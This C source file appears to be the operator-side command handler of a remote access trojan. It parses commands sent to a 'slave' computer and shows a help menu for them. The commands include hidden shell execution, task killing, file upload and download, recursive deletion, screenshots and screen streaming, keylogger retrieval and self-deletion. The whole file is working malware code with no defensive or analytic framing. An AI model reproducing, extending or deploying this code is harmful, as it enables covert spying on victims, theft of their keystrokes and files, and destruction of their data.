#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "types.h"
#include "logger.h"
#include "server.h"
#include "server/serv_cmds.h"
#include "net/interface.h"

char* serv_cmds_list[SERV_CMDS_COUNT] =    { " ", "send ", "info", "terminate", "system ", "task list ", "task kill ", "disk list", "cd ", "ls", "ls ", "remove ", "file send ", "file get ", "mbox ", "self delete", "screen get ", "klog info", "klog clear", "klog get ", "screen cap " };

int serv_cmds_equals(char* msg, int msgLen, int cmdId)
{
	int cmdLen = strlen(serv_cmds_list[cmdId]);

	if(msgLen < cmdLen)
	{
		return 0;
	}

	if(strncmp(msg, serv_cmds_list[cmdId], cmdLen) == 0)
	{
		if(serv_cmds_list[cmdId][cmdLen - 1] != ' ') //no args
		{
			return 1;
		}

		if(strlen(msg) > cmdLen) //has args
		{
			return 1;
		}
	}

	return 0;
}

int serv_cmds_format(OUT_STRP msg, int len, int cmdId)
{
	int cmdLen = strlen(serv_cmds_list[cmdId]);
	
	if(!(len - cmdLen))
	{
		return 0;
	}

	int nlen = len - cmdLen;

	char* nmsg = malloc(nlen + sizeof(char));
	strcpy(nmsg, *msg + cmdLen);
	*msg = nmsg;

	return 1;
}

int serv_cmds_ExportArg(OUT_STRP msg, OUT_STRP arg, int startIndex)
{
	int i;
	int cutIndex = 0;
	int retIndex = 0;
	char* tmsg = *msg;

	for(i = 0; i != strlen(tmsg); i++)
	{
		if(i >= startIndex)
		{
			if(tmsg[i] == SERV_CMDS_SEP)
			{
				if(i - 1 >= 0)
				{
					if(tmsg[i - 1] == '\\')
					{
						strcpy(tmsg + (i - 1), tmsg + i);
						tmsg[strlen(tmsg)] = 0x0;

						continue;
					}
				}

				cutIndex = i;

				if(i + 2 < strlen(tmsg))
				{
					retIndex = i + 2;
				}

				break;
			}
		}
	}

	if(cutIndex < 1)
	{
		tmsg -= startIndex;
		*arg = NULL;

		return 0;
	}

	int len = cutIndex - startIndex;
	char* narg = malloc(len + sizeof(char));
	memset(narg, 0, len + sizeof(char));
	strncpy(narg, tmsg + startIndex, len);
	
	*arg = narg;

	return retIndex;
}

int serv_cmds_execute(char* str, int len)
{
	int rv = 0;

	if(serv_cmds_equals(str, len, SERV_CMDS_SEND))
	{
		if(!serv_cmds_format(&str, len, SERV_CMDS_SEND))
		{
			return SERV_CMDS_ERR_UNK;
		}

		return serv_SEND(str);
	}else if(serv_cmds_equals(str, len, SERV_CMDS_TERMINATE)){
		return serv_TERMINATE();
	}else if(serv_cmds_equals(str, len, SERV_CMDS_INFO)){
		return serv_INFO();
	}else if(serv_cmds_equals(str, len, SERV_CMDS_SYSTEM)){
		if(!serv_cmds_format(&str, len, SERV_CMDS_SYSTEM))
		{
			return SERV_CMDS_ERR_UNK;
		}

		return serv_SYSTEM(str);
	}else if(serv_cmds_equals(str, len, SERV_CMDS_TASK_LIST)){
		if(!serv_cmds_format(&str, len, SERV_CMDS_TASK_LIST))
		{
			return SERV_CMDS_ERR_UNK;
		}

		return serv_TASKLIST(str);
	}else if(serv_cmds_equals(str, len, SERV_CMDS_TASK_KILL)){
		if(!serv_cmds_format(&str, len, SERV_CMDS_TASK_KILL))
		{
			return SERV_CMDS_ERR_UNK;
		}

		return serv_TASKKILL(str);
	}else if(serv_cmds_equals(str, len, SERV_CMDS_DISK_LIST)){
		return serv_DISKLIST();
	}else if(serv_cmds_equals(str, len, SERV_CMDS_HDD_CD)){
		if(!serv_cmds_format(&str, len, SERV_CMDS_HDD_CD))
		{
			return SERV_CMDS_ERR_UNK;
		}

		rv = serv_CD(str);

		net_SetBuffer(NET_BUFFSIZE);

		return rv;
	}else if(serv_cmds_equals(str, len, SERV_CMDS_HDD_LS_P)){
		if(!serv_cmds_format(&str, len, SERV_CMDS_HDD_LS_P))
		{
			return SERV_CMDS_ERR_UNK;
		}

		rv = serv_LS_Path(str);

		net_SetBuffer(NET_BUFFSIZE);

		return rv;
	}else if(serv_cmds_equals(str, len, SERV_CMDS_HDD_LS)){
		rv = serv_LS();

		net_SetBuffer(NET_BUFFSIZE);

		return rv;
	}else if(serv_cmds_equals(str, len, SERV_CMDS_HDD_REMOVE)){
		if(!serv_cmds_format(&str, len, SERV_CMDS_HDD_REMOVE))
		{
			return SERV_CMDS_ERR_UNK;
		}

		return serv_REMOVE(str);
	}else if(serv_cmds_equals(str, len, SERV_CMDS_FILE_SEND)){
		if(!serv_cmds_format(&str, len, SERV_CMDS_FILE_SEND))
		{
			return SERV_CMDS_ERR_UNK;
		}

		return serv_FILESEND(str);
	}else if(serv_cmds_equals(str, len, SERV_CMDS_FILE_GET)){
		if(!serv_cmds_format(&str, len, SERV_CMDS_FILE_GET))
		{
			return SERV_CMDS_ERR_UNK;
		}

		return serv_FILEGET(str);
	}else if(serv_cmds_equals(str, len, SERV_CMDS_MESSAGE_BOX)){
		if(!serv_cmds_format(&str, len, SERV_CMDS_MESSAGE_BOX))
		{
			return SERV_CMDS_ERR_UNK;
		}

		return serv_MESSAGEBOX(str);
	}else if(serv_cmds_equals(str, len, SERV_CMDS_SELF_DEL)){
		return serv_SELFDEL();
	}else if(serv_cmds_equals(str, len, SERV_CMDS_SCREEN_GET)){
		if(!serv_cmds_format(&str, len, SERV_CMDS_SCREEN_GET))
		{
			return SERV_CMDS_ERR_UNK;
		}

		return serv_SCREENGET(str);
	}else if(serv_cmds_equals(str, len, SERV_CMDS_KEYLOGGER_INFO)){
		return serv_KEYLOGGER_INFO();
	}else if(serv_cmds_equals(str, len, SERV_CMDS_KEYLOGGER_CLEAR)){
		return serv_KEYLOGGER_CLEAR();
	}else if(serv_cmds_equals(str, len, SERV_CMDS_SCREEN_CAP)){
		if(!serv_cmds_format(&str, len, SERV_CMDS_SCREEN_CAP))
		{
			return SERV_CMDS_ERR_UNK;
		}

		return serv_SCREENCAP(str);
	}else if(serv_cmds_equals(str, len, SERV_CMDS_KEYLOGGER_GET)){
		if(!serv_cmds_format(&str, len, SERV_CMDS_KEYLOGGER_GET))
		{
			return SERV_CMDS_ERR_UNK;
		}

		return serv_KEYLOGGER_GET(str);
	}

	return SERV_CMDS_ERR_UNK;
}

int serv_cmds_Translate(char* str, int len)
{
	LOG_NEWLINE();

	if(strcmp(str, "help") == 0)
	{
		LOG(LOG_TABLE, "help                                This\n");
		LOG(LOG_TABLE, "stop                                Exit\n");
		LOG(LOG_TABLE, "clear                               Clears console\n");
		LOG(LOG_TABLE, "send {MSG}                          Send message\n");
		LOG(LOG_TABLE, "terminate                           Terminate the slave\n");
		LOG(LOG_TABLE, "info                                Get slave computer information\n");
		LOG(LOG_TABLE, "system {CMD}                        Execute hidden CMD command\n");
		LOG(LOG_TABLE, "task list {PAGE}                    List of user running task\n");
		LOG(LOG_TABLE, "task kill {PID}                     Kill a task from PID\n");
		LOG(LOG_TABLE, "disk list                           Display all drives\n");
		LOG(LOG_TABLE, "cd {PATH}                           Navigate to folder\n");
		LOG(LOG_TABLE, "ls {PATH}                           Display directory contents\n");
		LOG(LOG_TABLE, "ls                                  Display directory contents\n");
		LOG(LOG_TABLE, "remove {PATH}. {OP_ARG}             Delete folder or file; use \"-all\" to remove all files and folders\n");
		LOG(LOG_TABLE, "file send {SRC}, {DEST}             Send file to slave\n");
		LOG(LOG_TABLE, "file get {DEST}, {SRC}              Retrive file from slave\n");
		LOG(LOG_TABLE, "mbox {TITLE}, {MSG}, {TYPE}         Message box\n");
		LOG(LOG_TABLE, "                                     - {TYPE} = error; warning; question; info; none\n");
		LOG(LOG_TABLE, "self delete                         The slave deletes itself\n");
		LOG(LOG_TABLE, "screen get {W%%}, {H%%}, {DEST}       Screenshot; W & H max 100\n");
		LOG(LOG_TABLE, "screen cap {W%%}, {H%%}, {TIMER}      Screen stream; W & H max 100\n");
		LOG(LOG_TABLE, "klog info                           Keylogger information\n");
		LOG(LOG_TABLE, "klog clear                          Deletes keylogger data file\n");
		LOG(LOG_TABLE, "klog get {PATH}                     Retrive keylogger data and then deletes it\n");
		
		return SERV_CMDS_DONT_SEEDUP;
	}else if(strcmp(str, "stop") == 0){
		return SERV_CMDS_BREAK;
	}else if(strcmp(str, "clear") == 0){
		system("CLS");
		return SERV_CMDS_DONT_SEEDUP;
	}

	int rv = serv_cmds_execute(str, len);

	if(rv == SERV_CMDS_ERR_UNK)
	{
		LOG(LOG_WAR, "Unknow command! Type \"help\" for help.\n");
	}else if(rv == SERV_CMDS_ERR_ARG){
		LOG(LOG_WAR, "Invalid arguments!\n");
	}

	return rv;
}